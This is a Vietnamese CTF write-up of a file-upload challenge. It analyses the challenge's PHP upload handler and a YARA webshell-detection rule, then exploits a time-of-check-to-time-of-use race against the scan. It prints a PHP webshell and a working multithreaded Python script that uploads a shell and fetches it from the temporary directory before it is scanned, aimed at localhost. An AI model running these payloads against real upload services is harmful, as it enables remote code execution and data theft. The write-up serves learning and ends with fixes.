---
title: CyberCon 2025 SafeUpload Web Challenge
date: 2026-01-16 00:30:00 +0700
categories: [Web Exploitation, TOCTOU]
tags: [web, toctou]
author: khoa
description: A random CTF CHALL sent to me by Pzhat
toc: true
comments: true
---

## **Cách mình làm**
### Setup

![img-description](https://i.ibb.co/N2t4382c/image-2026-01-16-003200145.png)
_Source Files_

Nhìn vào file đề cho thì ta thấy nó sẽ được build và chạy bằng ```Docker```, nên đầu tiên chúng ra sẽ cài đặt Docker và chạy nó, về phần cài đặt Docker thì các bạn tự tìm hiểu nha.

### Recon & Đọc Source Code
#### Recon
Sau khi build và chạy container, truy cập vào ```localhost:8001``` thì chúng ta có 1 website như sau:
![img-description](https://i.ibb.co/rGTWTpxs/image-2026-01-16-003349163.png)
_Website_

Cơ bản thì đây là một website cho phép upload file, giờ mình sẽ thử upload 1 file lên.
![img-description](https://i.ibb.co/Cp5gcnCw/image-2026-01-16-003635326.png)
_Sau khi upload file_

Sau khi upload 1 file lên thì server sẽ tự động tạo ra 1 file có ```extension``` tương tự, với tên file là số có 4 chữ số ngẫu nhiên được lưu trong ```/uploads```

Khi mình up thử file ```shell.php``` với nội dung:
```php
<?php system($_GET['cmd']); ?>
```
thì đã bị server chặn, mình thử up một file php sử dụng kỹ thuật ```Image Magick```  lên thử thì nó không thể thực thi:
![img-description](https://i.ibb.co/j9dLCTtT/image-2026-01-16-004329331.png)

(Bạn có thể đọc thêm một bài liên quan tại [đây](https://poqpwppy.github.io/posts/Trickster/))

Và mình cũng đã thử 1 số kỹ thuật bypass khác như nối chuỗi, v.v nhưng vẫn không thành công, nên mình chuyển sang phân tích source code.
#### Phân tích Source Code
Source code bao gồm 3 folder ```public```, ```rules```, ```test``` và 3 file chính là ```index.php```, ```upload.php```, ```i_dont_like_webshell.yar```.

File ```index.php``` xử lí phần UI UX chính của web nên mình sẽ bỏ qua, và đi thẳng vào 2 file chính là ```upload.php``` và ```i_dont_like_webshell.yar```.
##### upload.php
Nội dung file ```upload.php```:
```php
<?php
declare(strict_types=1);
ini_set('display_errors', '0');

$TMP_DIR = __DIR__ . '/tmp';
$DST_DIR = __DIR__ . '/uploads';
$YARA    = '/usr/bin/yara';
$RULES   = '/var/app/rules/i_dont_like_webshell.yar';

function four_digits(): string {
  return str_pad((string)random_int(0, 9999), 4, '0', STR_PAD_LEFT);
}
function ext_of(string $name): string {
  $e = strtolower(pathinfo($name, PATHINFO_EXTENSION) ?? '');
  return $e ? ".$e" : '';
}
function bad($m,$c=400){ http_response_code($c); echo htmlspecialchars($m,ENT_QUOTES,'UTF-8'); exit; }

if ($_SERVER['REQUEST_METHOD'] !== 'POST') bad('POST only',405);
if (!isset($_FILES['file']) || !is_uploaded_file($_FILES['file']['tmp_name'])) bad('no file');

$orig = $_FILES['file']['name'] ?? 'noname';
$ext  = ext_of($orig);
$rand = four_digits();
$tmp_path = $TMP_DIR . '/' . $rand . $ext;

if (!move_uploaded_file($_FILES['file']['tmp_name'], $tmp_path)) bad('save failed',500);
chmod($tmp_path, 0644);

usleep(800 * 1000);

$out = []; $ret = 0;
$cmd = sprintf('%s -m %s %s 2>&1',
  escapeshellarg($YARA),
  escapeshellarg($RULES),
  escapeshellarg($tmp_path)
);
exec($cmd, $out, $ret);

$stdout   = implode("\n", $out);
$ruleName = 'Suspicious_there_is_no_such_text_string_in_the_image';
$hitByName = (strpos($stdout, $ruleName) !== false);

if ($ret === 1 || $hitByName) {
  @unlink($tmp_path);
  echo "Upload scanned: MALWARE detected. File removed.<br><a href=/>back</a>";
  exit;
} elseif ($ret === 0) {
  $dst = $DST_DIR . '/' . basename($tmp_path);
  if (!@rename($tmp_path, $dst)) { @copy($tmp_path, $dst); @unlink($tmp_path); }
  echo "Upload scanned: OK. Moved to <a href=./uploads/" . htmlspecialchars(basename($dst)) . ">View Guide</a>";
  exit;
} else {
  @unlink($tmp_path);
  bad('scan error',500);
}
```
Đây là file xử lí logic chính của web,

```php
<?php
declare(strict_types=1);
ini_set('display_errors', '0');

$TMP_DIR = __DIR__ . '/tmp';
$DST_DIR = __DIR__ . '/uploads';
$YARA    = '/usr/bin/yara';
$RULES   = '/var/app/rules/i_dont_like_webshell.yar';
```
- ```declare(strict_types=1);```: để bật kiểm tra kiểu dữ liệu.
- ```ini_set('display_errors', '0');```: không hiển thị lỗi.
còn lại là phần khai báo.

Có thể thấy thêm được web này sử dụng Yara để kiểm soát việc upload file.

```php
function four_digits(): string {
  return str_pad((string)random_int(0, 9999), 4, '0', STR_PAD_LEFT);
}
```
Đây là hàm để tạo ra 4 kí tự số random cho tên file.

```php
function ext_of(string $name): string {
  $e = strtolower(pathinfo($name, PATHINFO_EXTENSION) ?? '');
  return $e ? ".$e" : '';
}
```
Đây là hàm để lấy ```extension``` của file.

```php
function bad($m,$c=400){ http_response_code($c); echo htmlspecialchars($m,ENT_QUOTES,'UTF-8'); exit; }

if ($_SERVER['REQUEST_METHOD'] !== 'POST') bad('POST only',405);
if (!isset($_FILES['file']) || !is_uploaded_file($_FILES['file']['tmp_name'])) bad('no file');
```
Đây là phần hiển thị lỗi và kiểm tra ```HTTP request``` xem có dùng method ```POST``` hay có upload file hay không.

```php
orig = $_FILES['file']['name'] ?? 'noname';
$ext  = ext_of($orig);
$rand = four_digits();
$tmp_path = $TMP_DIR . '/' . $rand . $ext;

if (!move_uploaded_file($_FILES['file']['tmp_name'], $tmp_path)) bad('save failed',500);
chmod($tmp_path, 0644);
```
Đây là phần tạo file với format ```XXXX.$ext``` và lưu vào đường dẫn ```/tmp/``` với đường dẫn cuối cùng là ```/tmp/XXXX.$ext```, đồng thời kiểm tra xem file có được lưu thành công hay không.

```php
usleep(800 * 1000);
```
Câu lệnh này có vẻ là để chống ```DDOS```.

```php
$out = []; $ret = 0;
$cmd = sprintf('%s -m %s %s 2>&1',
  escapeshellarg($YARA),
  escapeshellarg($RULES),
  escapeshellarg($tmp_path)
);
exec($cmd, $out, $ret);

$stdout   = implode("\n", $out);
$ruleName = 'Suspicious_there_is_no_such_text_string_in_the_image';
$hitByName = (strpos($stdout, $ruleName) !== false);

if ($ret === 1 || $hitByName) {
  @unlink($tmp_path);
  echo "Upload scanned: MALWARE detected. File removed.<br><a href=/>back</a>";
  exit;
} elseif ($ret === 0) {
  $dst = $DST_DIR . '/' . basename($tmp_path);
  if (!@rename($tmp_path, $dst)) { @copy($tmp_path, $dst); @unlink($tmp_path); }
  echo "Upload scanned: OK. Moved to <a href=./uploads/" . htmlspecialchars(basename($dst)) . ">View Guide</a>";
  exit;
} else {
  @unlink($tmp_path);
  bad('scan error',500);
}
```
Phần còn lại này sử dụng Yara để kiểm tra file. Nếu có vi phạm rule thì nó sẽ trả về ```$ret=1``` thì nó sẽ xoá file. Còn nếu file không vi phạm gì thì nó sẽ copy file tới ```/uploads```.

##### i_dont_like_webshell.yar
```yar
rule Suspicious_there_is_no_such_text_string_in_the_image
{
  meta:
    description = "Broader PHP webshell heuristics for CTF (fast, no backtick regex)"
    severity = "high"
  
  strings:
    $php_any     = /<\?(php|=)?/ nocase
    $php_script  = "<script language=\"php\">" nocase

    $eval1     = "eval" nocase
    $assert1   = "assert" nocase
    $system1   = "system" nocase
    $exec1     = "exec" nocase
    $shexec1   = "shell_exec" nocase
    $passthru1 = "passthru" nocase
    $popen1    = "popen" nocase
    $procopen1 = "proc_open" nocase

    $cmd1      = "cmd" nocase
    $cmd2      = "command" nocase

    $cuf       = "call_user_func(" nocase
    $cufa      = "call_user_func_array(" nocase
    $reflf     = "ReflectionFunction" nocase
    $crefunc   = "create_function(" nocase
    $preg_e    = /preg_replace\s*\(\s*[^,]*['"][^'"]*e['"]/ nocase

    // wrappers & inputs
    $php_input   = "php://input" nocase
    $php_filter  = "php://filter" nocase
    $phar        = "phar://" nocase
    $zipwrap     = "zip://" nocase
    $superglobal = /\$_(GET|POST|REQUEST|COOKIE|FILES|SERVER)\s*\[/ nocase

    // short code
    $short_bt_post   = "<?=`$_POST[" nocase
    $short_bt_get    = "<?=`$_GET[" nocase
    $short_bt_req    = "<?=`$_REQUEST[" nocase
    $short_bt_cookie = "<?=`$_COOKIE[" nocase

    // obfuscators
    $base64    = "base64_decode(" nocase
    $rot13     = "str_rot13(" nocase
    $inflate   = "gzinflate(" nocase
    $gzuncomp  = "gzuncompress(" nocase
    $hex2bin   = "hex2bin(" nocase
    $urldec    = "urldecode(" nocase
    $rawurl    = "rawurldecode(" nocase
    $strrev    = "strrev(" nocase

    // re
    $assign_func = /\$[A-Za-z_]\w*\s*=\s*["'](system|exec|shell_exec|passthru|popen|proc_open)["']/ nocase
    $assign_concat_system = /\$[A-Za-z_]\w*\s*=\s*["']sys["']\s*\.\s*["']tem["']/ nocase
    $var_call_super = /\$[A-Za-z_]\w*\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/ nocase
    $assign_concat_multi = /\$[A-Za-z_]\w*\s*=\s*\$[A-Za-z_]\w*\s*\.\s*["'](tem|xec|shell_exec)["']/ nocase
    $assign_concat_more = /\$[A-Za-z_]\w*\s*=\s*(\$[A-Za-z_]\w*|\s*["']s["']\s*\.\s*["']ys["'])\s*\.\s*["']tem["']/ nocase


  condition:
    ( $php_any or $php_script )
    or
    ( 1 of ( $eval1, $assert1, $system1, $exec1, $shexec1, $passthru1, $popen1, $procopen1,
             $cuf, $cufa, $reflf, $crefunc, $preg_e, $cmd1, $cmd2,
             $short_bt_post, $short_bt_get, $short_bt_req, $short_bt_cookie)
      or ( $assign_func and $var_call_super )
      or ( $assign_concat_system and $var_call_super )
      or ( $assign_concat_multi )
      or ( $assign_concat_more )
    )
    and
    ( 1 of ( $base64, $rot13, $inflate, $gzuncomp, $hex2bin, $urldec, $rawurl, $strrev,
             $php_input, $php_filter, $phar, $zipwrap, $superglobal ) )
}
```
File trên là file rule cho Yara.

Vì rule Yara khá căng, chặn hết mọi thứ nó nghi hoặc nên mình sẽ suy nghĩ tới một hướng khác mà không phải là ```File Upload Bypass```.

#### Hướng giải
Sau một hồi suy nghĩ căng thẳng, mình thấy quá bí vì không có cách nào để bypass được cái rules của Yara, khá là buồn :<.

Và mình chợt nhận ra trong logic của việc upload, nó sẽ tiến hành tạo 1 file trong folder ```/tmp```, sau đó sleep 0,8 giây rồi mới tiến hành kiểm tra file, mình nghĩ ngay đến việc chạy đua với server =))) và tiến hành khai thác lỗ hỏng ```Race Condition```, hay còn được gọi là ```TOCTOU```(Time-of-check to Time-of-use).

##### Giải thích về TOCTOU
TOCTOU (Time-of-Check to Time-of-Use) là một kiểu lỗi bảo mật theo kiểu "đời không như là mơ". Nói ngắn gọn: Bạn kiểm tra mọi thứ thấy ổn rồi mới làm, nhưng vào ngay cái khoảnh khắc sau khi kiểm tra và trước khi làm, có một đứa nhanh tay đã nhảy vào "thay trắng thay đen" =))).

Nó giống như việc bạn nhìn vào tài khoản thấy còn 500k, hí hửng bước vào quán gọi bát phở đặc biệt, nhưng ngay lúc bạn đang gọi món thì vợ bạn đã âm thầm rút sạch tiền qua app ngân hàng. Lúc thanh toán thì mới biết là đã bay sạch quỹ :v.

Nói một cách chuyên sâu hơn thì ```TOCTOU``` xảy ra khi thời điểm kiểm tra trạng thái của một tài nguyên khác với thời điểm sử dụng tài nguyên đó. Từ đó hacker có thể đua để thay đổi trạng thái của tài nguyên giữa hai thời điểm đó.

### Nghịch
Mình sẽ đua với hệ thống, dùng cặp method ```POST``` để upload file php độc hại lên và method ```GET``` để bắt được file trong folder ```/tmp``` trước khi nó được kiểm tra bởi Yara.

#### Payload
Mình viết một script ```python``` như sau để thực hiện gửi liên tục cặp request:

```python
import requests
import threading
import os

URL_POST = "http://localhost:8001/upload.php"
URL_TMP = "http://localhost:8001/tmp/" 

SHELL_CONTENT = b"<?php echo 'ALIVE_SHELL '; system('cat /*.txt'); ?>"

def uploader(): 
    files = {'file': ('shell.php', SHELL_CONTENT)}
    while True:
        try:
            requests.post(URL_POST, files=files, timeout=5)
        except:
            pass

def fetcher(start_id, end_id):
    while True:
        for i in range(start_id, end_id):
            target_file = f"{i:04d}.php"
            target_url = URL_TMP + target_file
            try:
                r = requests.get(target_url, timeout=0.5)
                if "ALIVE_SHELL" in r.text:
                    print(f"\n[!!!] ĐÃ BẮT ĐƯỢC SHELL TRONG /tmp: {target_url}")
                    print(f"[>] FLAG: {r.text.replace('ALIVE_SHELL', '').strip()}")
                    os._exit(0)
            except:
                pass

if __name__ == "__main__":
    print("[*] Khởi động cuộc đua Post & Get trực tiếp vào /tmp...")
    
    for _ in range(10):
        threading.Thread(target=uploader, daemon=True).start()
    
    step = 100
    for i in range(0, 1000, step):
        threading.Thread(target=fetcher, args=(i, i + step), daemon=True).start()

    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Dừng cuộc đua.")
```

##### Giải thích payload
```python
import requests
import threading
import os

URL_POST = "http://localhost:8001/upload.php"
URL_TMP = "http://localhost:8001/tmp/" 

SHELL_CONTENT = b"<?php echo 'ALIVE_SHELL '; system('cat /*.txt'); ?>"
```

Đây là phần import thư viện cần thiết và khai báo biến.

```python
def uploader(): 
    files = {'file': ('shell.php', SHELL_CONTENT)}
    while True:
        try:
            requests.post(URL_POST, files=files, timeout=5)
        except:
            pass
```
Hàm ```uploader()``` để up một file ```shell.php``` với nội dung đã khai báo sẵn (```<?php echo 'ALIVE_SHELL '; system('cat /*.txt'); ?>```).

```python
def fetcher(start_id, end_id):
    while True:
        for i in range(start_id, end_id):
            target_file = f"{i:04d}.php"
            target_url = URL_TMP + target_file
            try:
                r = requests.get(target_url, timeout=0.5)
                if "ALIVE_SHELL" in r.text:
                    print(f"\n[!!!] ĐÃ BẮT ĐƯỢC SHELL TRONG /tmp: {target_url}")
                    print(f"[>] FLAG: {r.text.replace('ALIVE_SHELL', '').strip()}")
                    os._exit(0)
            except:
                pass
```
Hàm ```fetcher()``` dùng để get file trong dir ```/tmp```, sử dụng ```f-string``` của ```python``` để bắt được bất kì tên file nào nằm trong khoảng từ ```start_id``` đến ```end_id```.

```python
if __name__ == "__main__":
    print("[*] Khởi động cuộc đua Post & Get trực tiếp vào /tmp...")
    
    for _ in range(10):
        threading.Thread(target=uploader, daemon=True).start()
    
    step = 100
    for i in range(0, 1000, step):
        threading.Thread(target=fetcher, args=(i, i + step), daemon=True).start()

    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Dừng cuộc đua.")
```

Hàm main để tạo ra luồng cho việc upload và fetch.

![img-description](https://i.ibb.co/TDNsg7p5/image-2026-01-16-094030057.png)
_Đã bắt được flag_

## **Kết luận**
### Bản chất
Bản chất của bài này là lỗ hỏng ```Race Condition```, bằng việc thay đổi hoặc truy cập tài nguyên trong khoảng thời gian từ lúc file xuất hiện cho tới lúc file được kiểm tra điều kiện.

### Kinh nghiệm rút ra
Loại bỏ ```usleep``` để giảm thời gian, trước khi move file vào folder ```/tmp``` rồi mới kiểm tra bằng Yara thì tiến hành kiểm tra trực tiếp luôn, và tăng tính ngẫu nhiên của tên file thay vì chỉ để là 4 chữ số random.

### Lời kết
Thôi thì bài writeup của mình cũng chỉ đến đây thôi =))) Chúc các bạn 1 ngày vui vẻ, mình ngủ đây.


